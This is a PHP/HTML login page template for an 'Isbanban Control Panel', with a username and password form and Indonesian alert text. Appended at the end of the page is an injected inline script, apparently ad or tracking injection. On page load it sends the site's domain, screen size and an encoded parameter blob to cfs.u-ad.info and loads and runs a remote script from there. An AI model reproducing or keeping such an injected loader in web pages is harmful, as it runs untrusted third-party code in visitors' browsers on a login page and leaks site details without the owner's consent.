
<!DOCTYPE html>
<html>

<head>
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Fonts -->
    <link href='http://fonts.googleapis.com/css?family=Roboto+Condensed:300,400' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Lato:300,400,700,900' rel='stylesheet' type='text/css'>
    <!-- CSS Libs -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/animate.min.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/bootstrap-switch.min.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/checkbox3.min.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/jquery.dataTables.min.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/dataTables.bootstrap.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/select2.min.css">
    <!-- CSS App -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/style.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>template/assets/css/themes/flat-blue.css">
</head>
<style>
body.login-page {
    background:url(http://placemi.com/1200x800) no-repeat center center;
    background-size: cover !important;
}
.login-form {
    background: rgba(0,0,0,0.45); 
    padding:20px 0px
}
</style>
<body class="flat-blue login-page">
    <div class="container">
        <div class="login-box">
            <div>
                <div class="login-form row">
                    <div class="col-sm-12 text-center login-header">
                        <img src="http://isbanban.org/wp-content/uploads/2015/07/isbanban1-e1437047014513.png" alt="" class="img-responsive" style="margin:0px auto">
                        <h4 class="login-title">Isbanban Control Panel</h4>
                    </div>

                    <?php if($this->session->flashdata('EL')) { ?>
                    <div class="col-sm-12" style="margin-bottom:0px">
                        <div class="alert alert-warning" role="alert">
                            <strong>Bzzz!</strong> Periksa kembali <b>username</b> dan <b>password</b> kakak.
                        </div>
                    </div>
                    <?php } ?>


                    <div class="col-sm-12">
                        <div class="login-body">
                            <form action="<?php echo base_url() ?>auth/cek" method="post">
                                <div class="control">
                                    <input type="text" class="form-control" value="" name="username" placeholder="Username"/>
                                </div>
                                <div class="control">
                                    <input type="password" class="form-control" name="password" placeholder="Password" />
                                </div>
                                <div class="login-button text-center">
                                    <input type="submit" class="btn btn-primary btn-block" value="Login">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Javascript Libs -->
    <script type="text/javascript" src="../../lib/js/jquery.min.js"></script>
    <script type="text/javascript" src="../../lib/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="../../lib/js/Chart.min.js"></script>
    <script type="text/javascript" src="../../lib/js/bootstrap-switch.min.js"></script>
    
    <script type="text/javascript" src="../../lib/js/jquery.matchHeight-min.js"></script>
    <script type="text/javascript" src="../../lib/js/jquery.dataTables.min.js"></script>
    <script type="text/javascript" src="../../lib/js/dataTables.bootstrap.min.js"></script>
    <script type="text/javascript" src="../../lib/js/select2.full.min.js"></script>
    <script type="text/javascript" src="../../lib/js/ace/ace.js"></script>
    <script type="text/javascript" src="../../lib/js/ace/mode-html.js"></script>
    <script type="text/javascript" src="../../lib/js/ace/theme-github.js"></script>
    <!-- Javascript -->
    <script type="text/javascript" src="../../js/app.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpngYz%2frpBS8YB9lUiMtD5525lzaN7roCHi08oDc3BaEH%2buxxsiEcggP9Hsq8E9FGda0P8svk38PubqMreOh7P2YGe6MFdLaJpj4nD0idzlsFbWaMHY7eWiQDhsocXDiZW7m8N3xgwsdGKHh%2flvEINhFtTqomv4p%2fZ82Azlaaz5EG4BWcEbx35bVLi0JJ1OZ7OjW7H7fgdSzJsGToxFcFJulXPBW2eyKspVVZoHnkKqIvKobzbSUk0eoBqEyVqdtNUqG4JbL2JGwfJ1%2bKOvUtr1yG%2fETMb9sx3IKBowhW1O4QXw0wznvdbUAa97ioimSYbsnObIEjwzVoCLtEv1N6pLEN%2bccFs3lF6aJSyaeXp923uQKtMWaRTKLGab0Sm0RoZWdINrCs1nhDPgt6neWRualNMAvYjVhT6p6FZaEiOIfu7d7fyEXBD4p23evZZp4OrzAbQssszYlrN%2f49e1K1aokl205uX1ASDDqybwCrVpE2JQUfH2WQF1aSe7QIWRDM6rM65xSsgz6l9T%2fwGimkQV%2bPqL4NnYY2R31OXpc4Z90dSXnSjCD9Monb5sB%2fJmOUrUEWaTX1V2Xtpupe6E7RfhGKVmRt%2bFeVzQ" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
